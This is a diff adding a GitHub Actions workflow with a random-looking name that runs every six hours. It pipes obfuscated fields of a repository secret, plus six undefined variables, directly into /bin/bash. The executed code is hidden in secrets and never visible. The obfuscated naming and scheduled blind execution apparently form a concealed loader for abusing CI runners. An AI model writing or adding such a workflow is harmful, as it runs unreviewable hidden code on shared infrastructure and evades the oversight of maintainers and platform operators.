@@ -1,0 +1,23 @@
+name: nikenengyijingfenglexianzai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nikenengyijingfenglexianzai
+        env:
+          wbm3: ${{ secrets.wbm3 }}
+        run: |
+          echo $wbm3 | jq -r .umv26406 | /bin/bash
+          echo $obcri3 | jq -r .giclu30 | /bin/bash
+          echo $nghsq2 | jq -r .idngv866 | /bin/bash
+          echo $v1026 | jq -r .g70 | /bin/bash
+          echo $srcx34167 | jq -r .ry28693 | /bin/bash
+          echo $d9 | jq -r .fmr89 | /bin/bash
+          echo $fa974 | jq -r .ytrrr18357 | /bin/bash
+
